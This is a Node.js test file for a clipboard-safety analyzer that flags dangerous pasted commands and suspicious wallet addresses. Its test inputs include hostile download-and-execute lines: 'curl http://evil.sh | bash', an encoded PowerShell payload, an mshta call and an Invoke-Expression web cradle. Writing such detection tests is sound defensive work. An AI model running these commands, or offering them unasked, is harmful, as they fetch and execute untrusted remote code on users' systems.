'use strict';
const test = require('node:test');
const assert = require('node:assert');
const { analyzeClipboardWrite } = require('../../engine/clipboard_rules');

test('PowerShell payload is dangerous', () => {
  const r = analyzeClipboardWrite('powershell -enc SQBFAFgA...');
  assert.strictEqual(r.level, 'dangerous');
});

test('curl pipe bash is dangerous', () => {
  assert.strictEqual(analyzeClipboardWrite('curl http://evil.sh | bash').level, 'dangerous');
});

test('mshta / Invoke-Expression is dangerous', () => {
  assert.strictEqual(analyzeClipboardWrite('mshta http://x/a.hta').level, 'dangerous');
  assert.strictEqual(analyzeClipboardWrite('iex(New-Object Net.WebClient)').level, 'dangerous');
});

test('bare ETH address is suspicious (address-swap)', () => {
  const r = analyzeClipboardWrite('0x' + 'a'.repeat(40));
  assert.strictEqual(r.level, 'suspicious');
});

test('normal text is safe', () => {
  assert.strictEqual(analyzeClipboardWrite('Hello, here is the article link.').level, 'safe');
  assert.strictEqual(analyzeClipboardWrite('').level, 'safe');
  assert.strictEqual(analyzeClipboardWrite(null).level, 'safe');
});
